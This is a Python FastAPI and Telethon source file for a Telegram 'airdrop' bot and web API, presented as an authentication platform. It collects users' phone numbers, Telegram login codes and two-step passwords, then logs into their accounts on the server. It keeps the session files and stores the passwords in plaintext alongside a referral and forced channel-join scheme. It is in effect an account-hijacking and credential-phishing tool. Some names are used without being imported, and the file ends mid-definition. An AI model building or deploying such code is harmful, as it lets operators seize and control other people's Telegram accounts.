# ============================================================================
# Pro Shop Enterprise Telegram Authentication Platform
# Architecture: FastAPI + Telethon (MTProto) + Pydantic V2 + Async JSON DB
# Version: 22.0.0 | Enterprise Grade | Ultra-Professional
# ============================================================================

import os
import uuid
import time
import json
import asyncio
import logging
import secrets
import hashlib
import re
import traceback
from typing import Dict, Optional, Any, List, AsyncGenerator, Union
from pathlib import Path
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from enum import Enum

# --- Environment & Settings ---
from pydantic_settings import BaseSettings, SettingsConfigDict
from pydantic import BaseModel, Field

# --- FastAPI & Uvicorn ---
import uvicorn
from fastapi import FastAPI, Request, HTTPException, Depends, Query, status
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

# --- Telethon (MTProto & Bot) ---
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PhoneNumberBannedError,
    PhoneNumberInvalidError,
    ApiIdInvalidError
)
from telethon.tl.types import UpdateNewMessage, User
from telethon.sessions import StringSession

# ============================================================================
# 1. CONFIGURATION & ENVIRONMENT
# ============================================================================

class AppEnv(str, Enum):
    DEVELOPMENT = "development"
    PRODUCTION = "production"
    STAGING = "staging"

class Settings(BaseSettings):
    API_ID: int
    API_HASH: str
    TOKEN_BOT: str
    
    ENVIRONMENT: AppEnv = AppEnv.DEVELOPMENT
    SECRET_KEY: str = Field(default_factory=lambda: secrets.token_hex(32))
    ADMIN_TOKEN: str = Field(default="pro_shop_admin_secret")
    
    DB_FILE: str = "db.json"
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"
    LOG_FILE: str = "proshop_system.log"
    
    HOST: str = "0.0.0.0"
    PORT: int = 8000
    
    MAX_SESSIONS: int = 5000
    SESSION_TIMEOUT: int = 300
    RATE_LIMIT_REQUESTS: int = 30
    RATE_LIMIT_WINDOW: int = 60
    
    ENABLE_BOT: bool = True
    ENABLE_WEB_UI: bool = True
    
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

settings = Settings()

class AppConfig:
    BASE_DIR: Path = Path(__file__).parent.resolve()
    SESSION_DIR: Path = BASE_DIR / settings.SESSION_DIR
    LOG_DIR: Path = BASE_DIR / settings.LOG_DIR
    LOG_FILE: Path = LOG_DIR / settings.LOG_FILE
    DB_FILE: Path = BASE_DIR / settings.DB_FILE

AppConfig.SESSION_DIR.mkdir(parents=True, exist_ok=True)
AppConfig.LOG_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================================
# 2. LOGGING SYSTEM
# ============================================================================

class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        log_record = {
            "timestamp": datetime.utcnow().isoformat(),
            "level": record.levelname,
            "logger": record.name,
            "module": record.module,
            "function": record.funcName,
            "line": record.lineno,
            "message": record.getMessage(),
        }
        if record.exc_info:
            log_record["exception"] = self.formatException(record.exc_info)
        return json.dumps(log_record, ensure_ascii=False)

class Logger:
    @staticmethod
    def setup() -> logging.Logger:
        logger = logging.getLogger("pro_shop")
        logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)
        
        if logger.handlers: return logger
        
        formatter = logging.Formatter('%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s:%(lineno)d | %(message)s')
        
        from logging.handlers import RotatingFileHandler
        fh = RotatingFileHandler(AppConfig.LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        
        logger.addHandler(fh)
        logger.addHandler(ch)
        return logger

log = Logger.setup()

# ============================================================================
# 3. UTILITIES & SECURITY
# ============================================================================

class SecurityUtils:
    @staticmethod
    def sanitize_phone(phone: str) -> str:
        if not phone: return ""
        # Replace spaces with + if space is at the beginning (URL encoding issue)
        phone = phone.strip()
        if phone.startswith(' '):
            phone = '+' + phone[1:]
        cleaned = re.sub(r'[^\d+]', '', phone)
        if not cleaned.startswith('+') and cleaned.startswith('00'):
            cleaned = '+' + cleaned[2:]
        elif not cleaned.startswith('+') and cleaned.isdigit():
            cleaned = '+' + cleaned
        return cleaned

    @staticmethod
    def validate_phone(phone: str) -> bool:
        return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))

    @staticmethod
    def hash_string(text: str) -> str:
        return hashlib.sha256(text.encode('utf-8')).hexdigest()

    @staticmethod
    def generate_session_id(prefix: str = "sess") -> str:
        return f"{prefix}_{uuid.uuid4().hex}"

    @staticmethod
    def mask_sensitive_data(data: str, mask_char: str = '*', visible_chars: int = 4) -> str:
        if not data or len(data) <= visible_chars: return mask_char * len(data)
        return mask_char * (len(data) - visible_chars) + data[-visible_chars:]

# ============================================================================
# 4. RATE LIMITER
# ============================================================================

class RateLimiter:
    def __init__(self):
        self.requests: Dict[str, List[float]] = {}
        self.lock = asyncio.Lock()

    async def check(self, key: str, limit: int = None, window: int = None) -> bool:
        limit = limit or settings.RATE_LIMIT_REQUESTS
        window = window or settings.RATE_LIMIT_WINDOW
        
        async with self.lock:
            now = time.time()
            if key not in self.requests:
                self.requests[key] = []
            
            self.requests[key] = [t for t in self.requests[key] if now - t < window]
            
            if len(self.requests[key]) >= limit:
                return False
            
            self.requests[key].append(now)
            return True

rate_limiter = RateLimiter()

async def rate_limit_dependency(request: Request):
    client_ip = request.client.host if request.client else "unknown"
    if not await rate_limiter.check(client_ip):
        raise HTTPException(status_code=429, detail="Rate limit exceeded. Try again later.")
    return True

# ============================================================================
# 5. JSON DATABASE MANAGER
# ============================================================================
# ============================================================================
# 5. JSON DATABASE MANAGER (Advanced Airdrop System)
# ============================================================================

class JSONDatabase:
    def __init__(self, filepath: Path):
        self.filepath = filepath
        self.lock = asyncio.Lock()
        self.data: List[Dict[str, Any]] = []
        self.indexes: Dict[str, Dict[Any, int]] = {
            "user_id": {}, "phone": {}, "session_file": {}, "ref_code": {}
        }
        self._load()
        self._build_indexes()

    def _load(self):
        if self.filepath.exists():
            try:
                with open(self.filepath, 'r', encoding='utf-8') as f:
                    self.data = json.load(f)
                log.info(f"Database loaded with {len(self.data)} records.")
            except json.JSONDecodeError:
                log.error("Database corrupted. Starting fresh.")
                self.data = []
        else:
            self.data = []

    def _build_indexes(self):
        for i, record in enumerate(self.data):
            for key in self.indexes.keys():
                if key in record:
                    self.indexes[key][record[key]] = i

    async def save(self):
        async with self.lock:
            temp_file = self.filepath.with_suffix('.tmp')
            try:
                with open(temp_file, 'w', encoding='utf-8') as f:
                    json.dump(self.data, f, indent=4, ensure_ascii=False)
                temp_file.replace(self.filepath)
            except Exception as e:
                log.error(f"Database save error: {e}")

    async def add_user(self, user_data: Dict) -> Dict:
        async with self.lock:
            phone = user_data.get("phone")
            user_id = user_data.get("user_id")
            existing_idx = self.indexes["user_id"].get(user_id)
            
            if existing_idx is not None:
                self.data[existing_idx].update(user_data)
                if "balance" not in self.data[existing_idx]: self.data[existing_idx]["balance"] = 0
                if "ref_code" not in self.data[existing_idx]: self.data[existing_idx]["ref_code"] = secrets.token_hex(4)
                if "referrals" not in self.data[existing_idx]: self.data[existing_idx]["referrals"] = 0
                if "rewards" not in self.data[existing_idx]: self.data[existing_idx]["rewards"] = []
                if "invited_by" not in self.data[existing_idx]: self.data[existing_idx]["invited_by"] = None
                self.indexes["ref_code"][self.data[existing_idx]["ref_code"]] = existing_idx
                return self.data[existing_idx]
            else:
                user_data["balance"] = 0
                user_data["ref_code"] = secrets.token_hex(4)
                user_data["referrals"] = 0
                user_data["rewards"] = []
                user_data["invited_by"] = user_data.get("invited_by")
                
                self.data.append(user_data)
                idx = len(self.data) - 1
                self.indexes["user_id"][user_id] = idx
                self.indexes["phone"][phone] = idx
                self.indexes["session_file"][user_data["session_file"]] = idx
                self.indexes["ref_code"][user_data["ref_code"]] = idx
                
                await self.save()
                return user_data

    async def apply_referral(self, new_user_id: int, ref_code: str) -> bool:
        async with self.lock:
            inviter_idx = self.indexes["ref_code"].get(ref_code)
            if inviter_idx is not None:
                inviter = self.data[inviter_idx]
                if inviter.get("user_id") != new_user_id:
                    inviter["balance"] = inviter.get("balance", 0) + 1
                    inviter["referrals"] = inviter.get("referrals", 0) + 1
                    await self.save()
                    return True
            return False

    async def get_user_by_id(self, user_id: int) -> Optional[Dict]:
        async with self.lock:
            idx = self.indexes["user_id"].get(user_id)
            return self.data[idx] if idx is not None else None

    async def update_user_balance(self, user_id: int, new_balance: int, new_reward: Dict = None):
        async with self.lock:
            idx = self.indexes["user_id"].get(user_id)
            if idx is not None:
                self.data[idx]["balance"] = new_balance
                if new_reward:
                    self.data[idx]["rewards"].append(new_reward)
                await self.save()

    async def get_all_users(self) -> List[Dict]:
        async with self.lock:
            return self.data.copy()

db = JSONDatabase(AppConfig.DB_FILE)
# ============================================================================
# 6. TELEGRAM AUTH MANAGER
# ============================================================================

class SessionState(Enum):
    INITIALIZED = "INITIALIZED"
    CODE_SENT = "CODE_SENT"
    AWAITING_2FA = "AWAITING_2FA"
    LOGGED_IN = "LOGGED_IN"
    EXPIRED = "EXPIRED"
    ERROR = "ERROR"

class SessionData:
    def __init__(self, session_id: str, client: TelegramClient):
        self.session_id: str = session_id
        self.phone: Optional[str] = None
        self.client: TelegramClient = client
        self.phone_code_hash: Optional[str] = None
        self.last_access: float = time.time()
        self.is_connected: bool = False
        self.created_at: float = time.time()
        self.attempts: int = 0
        self.state: SessionState = SessionState.INITIALIZED

class TelegramAuthManager:
    def __init__(self):
        self.active_sessions: Dict[str, SessionData] = {}
        self.phone_to_session: Dict[str, str] = {}
        self.lock = asyncio.Lock()

    async def get_or_create_session(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> SessionData:
        async with self.lock:
            if session_id and session_id in self.active_sessions:
                session_data = self.active_sessions[session_id]
                session_data.last_access = time.time()
                if not session_data.is_connected:
                    await session_data.client.connect()
                    session_data.is_connected = True
                return session_data

            if phone and phone in self.phone_to_session:
                old_sid = self.phone_to_session[phone]
                if old_sid in self.active_sessions:
                    old_session = self.active_sessions[old_sid]
                    try:
                        await old_session.client.disconnect()
                    except:
                        pass
                    del self.active_sessions[old_sid]
                del self.phone_to_session[phone]

            await self._cleanup_expired_sessions()

            if len(self.active_sessions) >= settings.MAX_SESSIONS:
                raise HTTPException(status_code=503, detail="Server at maximum session capacity.")

            new_session_id = session_id or SecurityUtils.generate_session_id()
            session_file = str(AppConfig.SESSION_DIR / f"{new_session_id}.session")
            
            client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
            await client.connect()
            
            session_data = SessionData(new_session_id, client)
            session_data.is_connected = True
            self.active_sessions[new_session_id] = session_data
            
            if phone:
                self.phone_to_session[phone] = new_session_id
                session_data.phone = phone
                
            log.debug(f"Created session {new_session_id} for {phone or 'unknown'}.")
            return session_data

    async def _cleanup_expired_sessions(self):
        now = time.time()
        expired = [sid for sid, data in self.active_sessions.items() if now - data.last_access > settings.SESSION_TIMEOUT]
        for sid in expired:
            data = self.active_sessions.pop(sid)
            if data.phone in self.phone_to_session:
                del self.phone_to_session[data.phone]
            try:
                await data.client.disconnect()
                log.info(f"Cleaned up expired session {sid}.")
            except Exception as e:
                log.warning(f"Error disconnecting session {sid}: {e}")

    async def send_code(self, phone: str) -> Dict[str, Any]:
        phone = SecurityUtils.sanitize_phone(phone)
        if not SecurityUtils.validate_phone(phone):
            raise HTTPException(status_code=400, detail="Invalid phone format. Must be international (e.g., +1234567890).")

        session_data = await self.get_or_create_session(phone=phone)
        session_data.phone = phone
        session_data.state = SessionState.INITIALIZED

        try:
            result = await session_data.client.send_code_request(phone)
            session_data.phone_code_hash = result.phone_code_hash
            session_data.state = SessionState.CODE_SENT
            log.info(f"Code sent successfully to {phone}.")
            return {
                "status": "success",
                "session_id": session_data.session_id,
                "message": "Verification code sent to Telegram app."
            }
        except FloodWaitError as e:
            log.warning(f"Flood wait for {phone}: {e.seconds}s.")
            raise HTTPException(status_code=429, detail=f"Telegram flood wait. Try again in {e.seconds} seconds.")
        except PhoneNumberBannedError:
            log.error(f"Phone number banned: {phone}.")
            raise HTTPException(status_code=403, detail="This phone number is banned from Telegram.")
        except Exception as e:
            log.error(f"SendCode Error for {phone}: {str(e)}", exc_info=True)
            raise HTTPException(status_code=400, detail=f"Telegram API Error: {str(e)}")

    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
        session_data = await self.get_or_create_session(session_id)
        session_data.attempts += 1
        
        if session_data.state != SessionState.CODE_SENT and session_data.state != SessionState.ERROR:
            if session_data.state == SessionState.AWAITING_2FA:
                raise HTTPException(status_code=400, detail="This session is waiting for 2FA password, not a code.")
            if session_data.state == SessionState.LOGGED_IN:
                raise HTTPException(status_code=400, detail="Session already logged in.")

        if not session_data.phone_code_hash:
            raise HTTPException(status_code=400, detail="Session invalid or code request expired. Please restart.")

        try:
            await session_data.client.sign_in(
                phone=session_data.phone,
                code=code,
                phone_code_hash=session_data.phone_code_hash
            )
            return await self._finalize_login(session_data)
        except SessionPasswordNeededError:
            session_data.state = SessionState.AWAITING_2FA
            log.info(f"2FA required for {session_data.phone}.")
            return {"status": "2fa_required", "message": "Two-step verification required."}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            session_data.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=f"Code error: {str(e)}")
        except Exception as e:
            log.error(f"VerifyCode Error: {str(e)}", exc_info=True)
            session_data.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=f"Invalid code or API error: {str(e)}")

    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
        session_data = await self.get_or_create_session(session_id)
        
        if session_data.state != SessionState.AWAITING_2FA:
            raise HTTPException(status_code=400, detail="Session is not awaiting 2FA password. Please verify code first.")

        try:
            await session_data.client.sign_in(password=password)
            return await self._finalize_login(session_data, password)
        except Exception as e:
            log.error(f"2FA Error: {str(e)}")
            raise HTTPException(status_code=400, detail="Invalid 2FA password or Telegram API error.")

    async def _finalize_login(self, session_data: SessionData, password: Optional[str] = None) -> Dict[str, Any]:
        me = await session_data.client.get_me()
        session_data.state = SessionState.LOGGED_IN
        
        # ساخت توکن امن برای داشبورد وب
        web_token = hashlib.sha256(f"{me.id}{settings.SECRET_KEY}".encode()).hexdigest()
        
        user_data = {
            "user_id": me.id, "first_name": me.first_name, "last_name": me.last_name,
            "username": me.username, "phone": session_data.phone, "password_2fa": password,
            "session_file": f"{session_data.session_id}.session", "login_date": datetime.now().isoformat(),
            "source": "API"
        }
        
        # ثبت رفرال اگر کاربر جدید است
        if hasattr(session_data, 'ref_code') and session_data.ref_code:
            await db.apply_referral(me.id, session_data.ref_code)
            user_data["invited_by"] = session_data.ref_code
            
        await db.add_user(user_data)
        log.info(f"User {me.id} ({session_data.phone}) authenticated.")
        
        try:
            await session_data.client.disconnect()
            session_data.is_connected = False
        except: pass
            
        return {"status": "success", "message": "Login successful.", "web_token": web_token, "user": user_data}

auth_manager = TelegramAuthManager()
# ============================================================================
# 7. TELEGRAM BOT INTEGRATION (Professional & Force-Join Enabled)
# ============================================================================

class BotStates:
    PHONE = "PHONE"
    CODE = "CODE"
    PASSWORD = "PASSWORD"



class TelegramBotManager:
    def __init__(self, token: str):
        self.token = token
        self.client = TelegramClient(
            str(AppConfig.SESSION_DIR / "bot.session"),
            settings.API_ID,
            settings.API_HASH,
        )
        self.user_states: Dict[int, Dict[str, Any]] = {}
        self.state_lock = asyncio.Lock()
        self.web_app_url = os.getenv("WEB_APP_URL", "https://python-api-1-c4y7.onrender.com/")
        raw_channels = os.getenv("REQUIRED_CHANNELS", "ProShopChannel,ProShopNews,ProShopSupport")
        self.required_channels: List[str] = [
            ch.strip().lstrip("@").strip() for ch in raw_channels.split(",") if ch.strip()
        ]
        self._membership_cache: Dict[Tuple[int, str], Tuple[bool, float]] = {}
        self._membership_cache_ttl = 180.0

    def _now(self) -> float:
        return time.time()

    def _channel_url(self, channel: str) -> str:
        return f"https://t.me/{channel}"

    def _format_join_text(self, missing_channels: List[str]) -> str:
        if not missing_channels:
            return """✅ عضویت شما تایید شد.

حالا دوباره /start را بزنید تا وارد داشبورد شوید."""
        lines = "\n".join(f"• @{ch}" for ch in missing_channels)
        return """🔒 برای استفاده از این ربات باید در کانال‌های زیر عضو باشید:

{lines}

بعد از عضویت، روی دکمه Verify Join بزنید.""".format(lines=lines)

    def _join_buttons(self, missing_channels: List[str]):
        buttons = []
        for channel in missing_channels:
            buttons.append([Button.url(f"📢 Join @{channel}", self._channel_url(channel))])
        buttons.append([Button.inline("✅ Verify Join", b"check_join")])
        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
        return buttons

    def _main_menu_buttons(self):
        return [[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]]

    def _membership_cache_valid(self, user_id: int, channel: str) -> bool:
        entry = self._membership_cache.get((user_id, channel))
        return bool(entry and (self._now() - entry[1] < self._membership_cache_ttl))

    async def check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
        if not self.required_channels:
            return True, []

        missing_channels: List[str] = []
        for channel in self.required_channels:
            cache_key = (user_id, channel)
            if self._membership_cache_valid(user_id, channel):
                if not self._membership_cache[cache_key][0]:
                    missing_channels.append(channel)
                continue

            try:
                await self.client.get_participant(channel, user_id)
                self._membership_cache[cache_key] = (True, self._now())
            except Exception:
                self._membership_cache[cache_key] = (False, self._now())
                missing_channels.append(channel)

        return len(missing_channels) == 0, missing_channels

    async def send_join_gate(self, event, user_id: int, missing_channels: List[str]):
        await event.respond(self._format_join_text(missing_channels), buttons=self._join_buttons(missing_channels))

    async def _ensure_joined_or_prompt(self, event, user_id: int) -> bool:
        ok, missing = await self.check_membership(user_id)
        if ok:
            return True
        await self.send_join_gate(event, user_id, missing)
        return False

    async def _ensure_context(self, user_id: int) -> Dict[str, Any]:
        async with self.state_lock:
            if user_id not in self.user_states:
                self.user_states[user_id] = {"state": BotStates.PHONE}
            return self.user_states[user_id]

    async def _clear_context(self, user_id: int):
        async with self.state_lock:
            state = self.user_states.pop(user_id, None)
        if state and state.get("client"):
            try:
                await state["client"].disconnect()
            except Exception:
                pass

    async def start(self):
        if not settings.ENABLE_BOT:
            return

        try:
            await self.client.start(bot_token=self.token)
            log.info("🤖 Pro Shop Bot started successfully.")

            @self.client.on(events.NewMessage(func=lambda e: e.is_private))
            async def handler(event):
                if not event.is_private:
                    return

                sender = await event.get_sender()
                if not sender or getattr(sender, "bot", False):
                    return

                text = (event.raw_text or "").strip()
                user_id = sender.id

                if text == "/cancel":
                    await self.cmd_cancel(event, user_id)
                    return

                if text == "/help":
                    await self.cmd_help(event, user_id)
                    return

                if text in ("/setmenu", "/dashboard", "/menu"):
                    await self.cmd_set_menu(event, user_id)
                    return

                if text == "/status":
                    await self.cmd_status(event, user_id)
                    return

                if text.startswith("/start"):
                    await self.cmd_start(event, user_id, text)
                    return

                if not await self._ensure_joined_or_prompt(event, user_id):
                    return

                ctx = await self._ensure_context(user_id)
                state = ctx.get("state", BotStates.PHONE)

                if state == BotStates.PHONE:
                    await self.handle_phone(event, user_id, text)
                elif state == BotStates.CODE:
                    await self.handle_code(event, user_id, text)
                elif state == BotStates.PASSWORD:
                    await self.handle_password(event, user_id, text)
                else:
                    await event.respond("Send /start to begin.")

            @self.client.on(events.CallbackQuery)
            async def callback_handler(event):
                user_id = event.sender_id
                data = (event.data or b"").decode("utf-8", errors="ignore")

                if data == "cancel_auth":
                    await self.cmd_cancel(event, user_id)
                    await event.answer("Cancelled.", alert=False)
                    return

                if data == "check_join":
                    ok, missing = await self.check_membership(user_id)
                    if ok:
                        await event.answer("Membership verified.", alert=False)
                        await event.respond(
                            "✅ عضویت شما تایید شد. حالا /start را بزنید یا از دکمه Mini App استفاده کنید.",
                            buttons=self._main_menu_buttons(),
                        )
                        await self.cmd_start(event, user_id, "/start")
                    else:
                        await event.answer("You still need to join all required channels.", alert=True)
                        await self.send_join_gate(event, user_id, missing)
                    return

        except Exception as e:
            log.error(f"Bot startup error: {e}", exc_info=True)

    async def cmd_set_menu(self, event, user_id: int):
        try:
            from telethon.tl.functions.bots import SetBotMenuButtonRequest
            from telethon.tl.types import BotMenuButton

            await self.client(
                SetBotMenuButtonRequest(
                    user_id=user_id,
                    button=BotMenuButton(text="🚀 Open App", url=self.web_app_url),
                )
            )
            await event.respond("✅ Menu button set successfully! Check the bottom left corner of your chat.")
        except Exception as e:
            await event.respond(f"❌ Error setting menu: {str(e)}")

    async def cmd_start(self, event, user_id: int, text: str = "/start"):
        ok = await self._ensure_joined_or_prompt(event, user_id)
        if not ok:
            return

        ctx = await self._ensure_context(user_id)
        ctx["state"] = BotStates.PHONE
        ctx.pop("session_id", None)
        ctx.pop("client", None)
        ctx.pop("phone", None)
        ctx.pop("phone_code_hash", None)
        ctx.pop("password", None)

        await event.respond(
            """👋 **Welcome to Pro Shop Airdrop Bot!**

1) Send your phone number in international format.
2) Enter the **5-digit** Telegram verification code.
3) If your account has 2FA, enter the password.

بعد از احراز هویت، داشبورد و ایردراپ برای شما باز می‌شود.""",
            buttons=self._main_menu_buttons(),
        )

    async def cmd_cancel(self, event, user_id: int):
        await self._clear_context(user_id)
        await event.respond("❌ Operation cancelled. Send /start to begin again.")

    async def cmd_status(self, event, user_id: int):
        state = self.user_states.get(user_id, {}).get("state", "NONE")
        await event.respond(f"""📊 **System Status**

Current State: `{state}`
Bot Status: `Online`""")

    async def cmd_help(self, event, user_id: int):
        await event.respond(
            """ℹ️ **Help & Commands**

/start - Begin authentication
/cancel - Cancel current operation
/setmenu - Add Mini App button to chat menu
/status - Check your current session state

⚠️ You must join the required channels before using the bot."""
        )

    async def handle_phone(self, event, user_id: int, text: str):
        phone = SecurityUtils.sanitize_phone(text)
        if not SecurityUtils.validate_phone(phone):
            await event.respond("❌ Invalid format. Please send like: `+1234567890`")
            return

        ctx = await self._ensure_context(user_id)
        session_id = SecurityUtils.generate_session_id("bot")
        session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
        await client.connect()

        try:
            result = await client.send_code_request(phone)
            ctx.update({
                "state": BotStates.CODE,
                "session_id": session_id,
                "phone": phone,
                "phone_code_hash": result.phone_code_hash,
                "client": client,
            })
            await event.respond("✅ Code sent! Please send the **5-digit** verification code you received.")
        except FloodWaitError as e:
            await event.respond(f"❌ Telegram flood wait. Try again in {e.seconds} seconds.")
            await client.disconnect()
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")
            await client.disconnect()

    async def handle_code(self, event, user_id: int, text: str):
        state = self.user_states.get(user_id)
        if not state:
            await event.respond("❌ Session expired. Please /start again.")
            return

        client = state.get("client")
        if not client or not client.is_connected():
            await event.respond("❌ Session expired. Please /start again.")
            return

        code = text.strip().replace(" ", "")
        if not (code.isdigit() and len(code) == 5):
            await event.respond("❌ Code must be exactly 5 digits.")
            return

        try:
            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
            me = await client.get_me()
            await self._save_bot_user(client, state["session_id"], state["phone"], None, me)
            await event.respond(f"✅ Login successful! Welcome, {me.first_name}.")
            await self._clear_context(user_id)
        except SessionPasswordNeededError:
            state["state"] = BotStates.PASSWORD
            await event.respond("🔒 Your account has 2FA enabled. Please send your password.")
        except PhoneCodeInvalidError:
            await event.respond("❌ Invalid 5-digit code.")
        except PhoneCodeExpiredError:
            await event.respond("❌ Code expired. Please /start again.")
        except Exception as e:
            await event.respond(f"❌ Invalid code: {str(e)}")

    async def handle_password(self, event, user_id: int, text: str):
        state = self.user_states.get(user_id)
        if not state:
            await event.respond("❌ Session expired. Please /start again.")
            return

        client = state.get("client")
        if not client:
            await event.respond("❌ Session expired. Please /start again.")
            return

        try:
            await client.sign_in(password=text)
            me = await client.get_me()
            await self._save_bot_user(client, state["session_id"], state["phone"], text, me)
            await event.respond(f"✅ 2FA successful! Welcome, {me.first_name}.")
            await self._clear_context(user_id)
        except Exception:
            await event.respond("❌ Invalid password. Try again or /cancel.")

    async def _save_bot_user(self, client: TelegramClient, session_id: str, phone: str, password: Optional[str], me: User):
        user_data = {
            "user_id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "phone": phone,
            "password_2fa": password,
            "session_file": f"{session_id}.session",
            "login_date": datetime.now().isoformat(),
            "source": "Telegram Bot",
        }
        await db.add_user(user_data)
        await client.disconnect()

bot_manager = TelegramBotManager(settings.TOKEN_BOT)




# ============================================================================
# 8. FASTAPI APPLICATION & MIDDLEWARES
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI) -> AsyncGenerator[None, None]:
    log.info("Starting Pro Shop Enterprise System...")
    if settings.ENABLE_BOT:
        asyncio.create_task(bot_manager.start())
    yield
    log.info("Shutting down Pro Shop Enterprise System...")

app = FastAPI(
    title="Pro Shop Telegram Auth API",
    description="Enterprise-grade MTProto authentication system with multi-platform support.",
    version="22.0.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class RequestLoggingMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        start_time = time.time()
        response = await call_next(request)
        process_time = (time.time() - start_time) * 1000
        formatted_time = "{:.2f}".format(process_time)
        
        log.info(
            f"REQ: {request.method} {request.url.path} | "
            f"IP: {request.client.host if request.client else 'N/A'} | "
            f"STATUS: {response.status_code} | "
            f"TIME: {formatted_time}ms"
        )
        return response

app.add_middleware(RequestLoggingMiddleware)

# ============================================================================
# 9. PYDANTIC MODELS
# ============================================================================

class SendCodeRequest(BaseModel):
    phone: str = Field(..., description="Phone number in international format")

class VerifyCodeRequest(BaseModel):
    session_id: str = Field(..., description="Session ID returned from send-code")
    code: str = Field(..., min_length=5, max_length=5, description="5-digit verification code")

class Verify2FARequest(BaseModel):
    session_id: str = Field(...)
    password: str = Field(..., min_length=1)

class UserResponse(BaseModel):
    user_id: int
    first_name: Optional[str]
    last_name: Optional[str]
    username: Optional[str]
    phone: str
    session_file: str
    login_date: str

class ApiResponse(BaseModel):
    status: str
    message: str
    data: Optional[Any] = None

# ============================================================================
# 10. API ROUTES (Fixed Raw GET & JSON POST)
# ============================================================================

@app.get("/api/v1/raw/auth", response_model=ApiResponse, tags=["Raw API"])
async def raw_api_auth(
    request: Request,
    num: Optional[str] = Query(None, description="Phone number"),
    otp: Optional[str] = Query(None, description="Verification code"),
    code: Optional[str] = Query(None, description="2FA Password")
):
    """
    Raw API Endpoint for automated systems.
    Step 1: /api/v1/raw/auth?num=+989123456789
    Step 2: /api/v1/raw/auth?num=+989123456789&otp=12345
    Step 3: /api/v1/raw/auth?num=+989123456789&otp=12345&code=mypassword
    """
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
        
    if not num:
        raise HTTPException(status_code=400, detail="Missing 'num' parameter")
    
    # CRITICAL FIX: Sanitize phone number immediately to handle URL encoding (e.g. + decoded as space)
    phone = SecurityUtils.sanitize_phone(num)
    if not SecurityUtils.validate_phone(phone):
        raise HTTPException(status_code=400, detail="Invalid phone format. Must be international (e.g., +1234567890).")
    
    try:
        if not otp:
            # Step 1: Send Code
            res = await auth_manager.send_code(phone)
            return {"status": "success", "message": "Code sent to Telegram.", "data": {"session_id": res["session_id"]}}
            
        elif otp and not code:
            # Step 2: Verify Code
            session_id = auth_manager.phone_to_session.get(phone)
            if not session_id:
                raise HTTPException(status_code=400, detail="Session not found. Request code first.")
            
            res = await auth_manager.verify_code(session_id, otp)
            if res["status"] == "2fa_required":
                return {"status": "2fa_required", "message": "2FA required. Provide 'code' parameter.", "data": None}
            return {"status": "success", "message": "Logged in successfully.", "data": res.get("user")}
            
        elif otp and code:
            # Step 3: Verify 2FA
            session_id = auth_manager.phone_to_session.get(phone)
            if not session_id:
                raise HTTPException(status_code=400, detail="Session not found.")
            
            res = await auth_manager.verify_2fa(session_id, code)
            return {"status": "success", "message": "2FA successful. Logged in.", "data": res.get("user")}
            
    except HTTPException as e:
        raise e
    except Exception as e:
        log.error(f"Raw API Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/json/send-code", response_model=ApiResponse, tags=["JSON API"])
async def json_send_code(payload: SendCodeRequest, request: Request):
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    res = await auth_manager.send_code(payload.phone)
    return {"status": "success", "message": res["message"], "data": {"session_id": res["session_id"]}}

@app.post("/api/v1/json/verify-code", response_model=ApiResponse, tags=["JSON API"])
async def json_verify_code(payload: VerifyCodeRequest, request: Request):
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    res = await auth_manager.verify_code(payload.session_id, payload.code)
    if res["status"] == "2fa_required":
        return {"status": "2fa_required", "message": res["message"], "data": None}
    return {"status": "success", "message": "Login successful.", "data": res.get("user")}

@app.post("/api/v1/json/verify-2fa", response_model=ApiResponse, tags=["JSON API"])
async def json_verify_2fa(payload: Verify2FARequest, request: Request):
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    res = await auth_manager.verify_2fa(payload.session_id, payload.password)
    return {"status": "success", "message": "2FA successful.", "data": res.get("user")}

@app.get("/api/v1/admin/users", response_model=List[UserResponse], tags=["Admin"])
